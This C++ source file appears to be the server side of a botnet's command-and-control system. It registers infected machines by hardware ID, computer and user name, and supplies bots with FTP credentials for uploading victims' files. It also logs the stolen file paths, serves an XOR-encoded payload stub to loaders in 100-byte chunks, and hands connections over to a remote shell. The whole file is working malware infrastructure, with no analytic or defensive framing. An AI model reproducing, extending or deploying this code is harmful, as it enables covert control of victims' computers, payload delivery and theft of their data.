#include "client.h"
#include "packets.h"
#include <thread>
#include <assert.h>
#include <random>
#include <time.h>
#include <windows.h>
#include "Shlwapi.h"
#include "md5_lib_src.h"
#include "encoder.h"
#include "common.h"
#include "controller_authkey.h"
#include <set>
#include "main.h"
#include "control_client.h"
void receive_thread(client* clnt);

client::client(SOCKET sock)
{
	socket = sock;

	DWORD value = 1;
	setsockopt(socket, IPPROTO_TCP, TCP_NODELAY, "1", 1);
	int flag = 1;
	setsockopt(sock, IPPROTO_TCP, TCP_NODELAY, (char *)&flag, sizeof(int));

	printf("Client %s connected!\r\n", get_client_ip());
	my_info.reset();
	my_info.crypto_key = packet_crypto_key;
	logger = nullptr;
	shell_session = false;
	new std::thread(receive_thread, this);
}

client::~client()
{
	if (logger)
		delete logger;

	logger = nullptr;
}

char* client::get_client_ip()
{
	struct sockaddr_in name;
	socklen_t len = sizeof(name);

	getpeername(socket, (struct sockaddr *)&name, &len);
	return inet_ntoa(name.sin_addr);
}

// thx NGA :*
bool create_dir(char* dir)
{
	char *p;
	bool b;

	if (!(b = (TRUE == CreateDirectoryA(dir, NULL))) &&
		!(b = (NULL == (p = strrchr(dir, '\\')))))
	{
		size_t i;

		(p = strncpy((char *)malloc(1 + i), dir, i = p - dir))[i] = '\0';

		b = create_dir(p);

		free(p);

		b = b ? (TRUE == CreateDirectoryA(dir, NULL)) : false;
	}

	return b;
}

bool client::send_packet(packet_opcode opcode, void* data /* = nullptr*/, int data_size /* = 0*/)
{
	unsigned char* buffer = new unsigned char[sizeof(net_packet) + data_size];
	memset(buffer, 0x00, sizeof(net_packet) + data_size);
	net_packet* frame = (net_packet*)buffer;
	frame->opcode = opcode;
	frame->packet_size = data_size;

	if (data_size)
	{
		memcpy(buffer + sizeof(net_packet), data, data_size);

		xor_encode(buffer + sizeof(net_packet), data_size, my_info.crypto_key);
	}

	bool res = send(socket, (char*)buffer, data_size + sizeof(net_packet), 0) == ERROR_SUCCESS;


	memset(buffer, 0x00, sizeof(net_packet) + data_size);
	delete[] buffer;
	buffer = nullptr;

	return res;
}

bool client::parse_packet()
{

	//unsigned char frame_buf[1500];
	//int bytes_read = recv(socket, (char*)frame_buf, sizeof(frame_buf), 0);


	//if (bytes_read <= 0)
	//	return false;

	//net_packet* frame = (net_packet*)(frame_buf);

	//if (bytes_read - sizeof(net_packet) < frame->packet_size)
	//	return false;


	//unsigned char packet_buf[1500 - sizeof(net_packet)];

	//if (frame->packet_size > 0)
	//{
	//	memcpy(packet_buf, frame_buf + sizeof(net_packet), frame->packet_size);

	//	xor_encode(packet_buf, frame->packet_size, my_info.crypto_key);
	//}

	auto recv_packet = [this](char* buffer, size_t size) -> int {
		int total = 0, n = 0;
		while (total != size)
		{
			n = recv(socket, buffer + total, size - total, 0);
			if (n <= 0)
				return 0;

			total += n;
		}
		return total;
	};

	unsigned char frame_buf[sizeof(net_packet)];
	int bytes_read = recv_packet((char*)frame_buf, sizeof(frame_buf));
	if (bytes_read <= 0)
		return false;
	net_packet* frame = (net_packet*)(frame_buf);




	unsigned char* packet_buf = nullptr;

	if (frame->packet_size)
	{
		packet_buf = new unsigned char[frame->packet_size];
		bytes_read = recv_packet((char*)packet_buf, frame->packet_size);
		if (bytes_read <= 0)
			return false;

		xor_encode(packet_buf, frame->packet_size, my_info.crypto_key);
	}

	return /*(controller_socket || frame->opcode == packet_opcode::controller_login) ? handle_controller_packet(frame->opcode, packet_buf, frame->packet_size) :*/
		handle_bot_packet(frame->opcode, packet_buf, frame->packet_size);
}

void client::print_received_packet(packet_opcode opcode, int packet_size)
{
	char opcode_name[128] = { 0 };

#define def_opcode_case(x) case packet_opcode::x: strcpy(opcode_name, #x); break
	switch (opcode)
	{
		def_opcode_case(bot_register);
		def_opcode_case(file_upload_ack);
		def_opcode_case(loader_register);
		def_opcode_case(loader_request_stub);
		def_opcode_case(request_speedtest_ack);
		def_opcode_case(request_speedtest_result);
	default:
		strcpy(opcode_name, "Unknown");
		break;
	}
#undef def_opcode_case

	printf("Received %s packet of size %d from %s [hwid: %llu]\r\n", opcode_name, packet_size, get_client_ip(), my_info.hwid);
	
}

bool client::handle_bot_packet(packet_opcode opcode, void* packet_buf, int packet_size)
{
	this->print_received_packet(opcode, packet_size);

	switch (opcode)
	{
		case packet_opcode::bot_register:
		{
			bot_register_payload* packet = (bot_register_payload*)packet_buf;

			excluded_bot_list_t bot_list;
			get_excluded_bots(bot_list);

			for (auto& entry : bot_list)
			{
				if (packet->hwid == entry)
				{
					send_packet(packet_opcode::kill_bot);
					return true;
				}
			}


			my_info.hwid = packet->hwid;
			my_info.type = client_type::bot;
			logger = new client_log(my_info.hwid);

			logger->write_log("Received bot_register packet!\r\n");
			logger->write_log("IP: %s, nHardware ID: %llu, Computer Name: %s, Computer User Name: %s, VisualStudio Installed: %s\r\n",
				get_client_ip(), packet->hwid, packet->computer_name, packet->user_name, packet->vs_installed_flag ? "true" : "false");


			unsigned long long new_crypto_key = std::uniform_int_distribution<unsigned long long>()(std::mt19937_64(std::random_device()()));
			bot_register_ok_payload ok_packet;
			ok_packet.crypto_key = new_crypto_key;
			strcpy(ok_packet.ftp_server_ip, FTP_UPLOAD_IP);
			strcpy(ok_packet.ftp_server_username, FTP_UPLOAD_USERNAME);
			strcpy(ok_packet.ftp_server_password, FTP_UPLOAD_PASSWORD);
			ok_packet.ftp_server_port = FTP_UPLOAD_PORT;

			strcpy(my_info.computer_name, packet->computer_name);
			strcpy(my_info.user_name, packet->user_name);
			my_info.is_vs_installed = packet->vs_installed_flag;

			send_packet(packet_opcode::bot_register_ok, &ok_packet, sizeof(ok_packet));
			my_info.crypto_key = new_crypto_key;
		}
		break;

		case packet_opcode::file_upload_ack:
		{
			file_upload_ack_payload* packet = (file_upload_ack_payload*)packet_buf;
			logger->write_log("Uploaded file - User Path: %s, Local Path: %s\r\n", packet->file_local_path, packet->file_remote_path);
			my_info.uploaded_files_list.insert(std::string(packet->file_local_path));
		}
		break;

		case packet_opcode::loader_register:
		{
			strcpy(my_info.computer_name, "N/A");
			strcpy(my_info.user_name, "N/A");
			my_info.type = client_type::loader;
			loader_register_ok_payload packet;
			packet.new_crypto_key = std::uniform_int_distribution<unsigned long long>()(std::mt19937_64(std::random_device()()));

			send_packet(packet_opcode::loader_register_ok, &packet, sizeof(packet));
			my_info.crypto_key = packet.new_crypto_key;
		}
		break;

		case packet_opcode::loader_request_stub:
		{
			std::vector<char> stub_data;
			auto stub_data_md5 = get_stub_data(&stub_data);

			loader_request_stub_ack_payload request_ack;
			request_ack.stub_size = stub_data.size();
			send_packet(packet_opcode::loader_request_stub_ack, &request_ack, sizeof(request_ack));


			int blocks = stub_data.size() / 100;
			int add_bytes = stub_data.size() - (blocks * 100);

			loader_request_stub_data_payload data;
			data.data_size = 100;

#ifdef _DEBUG
			data.total_cnt = blocks + !!add_bytes;
#endif // _DEBUG


			int off = 0;
			for (int i = 0; i < blocks; i++)
			{
				data.assign_data(stub_data.data() + off, 100);
				data.toggle_data_encoding();

				send_packet(packet_opcode::loader_request_stub_data, &data, sizeof(data));
				off += 100;
#ifdef _DEBUG
				data.current_cnt = i;
#endif // _DEBUG
			}

			if (add_bytes > 0)
			{
#ifdef _DEBUG
				data.current_cnt = data.total_cnt - 1;
#endif // _DEBUG
				memcpy(data.data, stub_data.data() + off, add_bytes);

				data.assign_data(stub_data.data() + off, add_bytes);
				data.toggle_data_encoding();

				send_packet(packet_opcode::loader_request_stub_data, &data, sizeof(data));
			}

			loader_request_stub_end_payload end_checksum;
			memcpy(end_checksum.md5_checksum, stub_data_md5.data(), 16);

			send_packet(packet_opcode::loader_request_stub_end, &end_checksum, sizeof(end_checksum));
		}
		break;

		case packet_opcode::request_speedtest_ack:
		{
			if (my_info.type != client_type::bot)
				break;

			my_info.speedtest.Reset();

			auto recv_packet = [this](char* buffer, size_t size) -> int {
				int total = 0, n = 0;
				while (total != size)
				{
					n = recv(socket, buffer + total, size - total, 0);
					if (n <= 0)
						return 0;

					total += n;
				}
				return total;
			};

			char speedtest_buffer[SPEEDTEST_BUFFER_SIZE];
			char ok_flag = 0xff;
			for (int i = 0; i < SPEEDTEST_RUN_COUNT; i++)
			{
				recv_packet(speedtest_buffer, SPEEDTEST_BUFFER_SIZE);
				send(get_client_socket(), &ok_flag, 1, 0);
			}
		}
		break;
		case packet_opcode::request_speedtest_result:
		{
			request_speedtest_result_payload* packet = (request_speedtest_result_payload*)packet_buf;
			my_info.speedtest.elapsed_time = packet->elapsed_ms;
			my_info.speedtest.performed_speedtest = true;
		}
		break;

		case packet_opcode::shell_switch:
		{
			shell_session = true;
			return false;
		}

		default:
			return false;
	}

	return true;
}

//bool client::handle_controller_packet(packet_opcode opcode, void* packet_buf, int packet_size)
//{
//	switch (opcode)
//	{
//		case packet_opcode::controller_login:
//		{
//			controller_login_payload* packet = (controller_login_payload*)packet_buf;
//			bool is_valid_key = is_valid_controller_authkey(packet->auth_key);
//
//			controller_login_ack_payload ack;
//			ack.login_succeeded = controller_socket = is_valid_key;
//			send_packet(packet_opcode::controller_login_ack, &ack, sizeof(ack));
//		}
//		break;
//
//		default:
//			return false;
//
//	}
//	return true;
//}

void receive_thread(client* clnt)
{
	do {} while (clnt->parse_packet());

	if (clnt->shell_session)
	{
		new control_client(clnt->get_client_socket());
		return;
	}

	if (clnt->shell_session) return;
	printf("Client disconnected!\r\n");
	closesocket(clnt->get_client_socket());
	erase_bot_from_bot_list(clnt);
	delete clnt;
	clnt = nullptr;
}

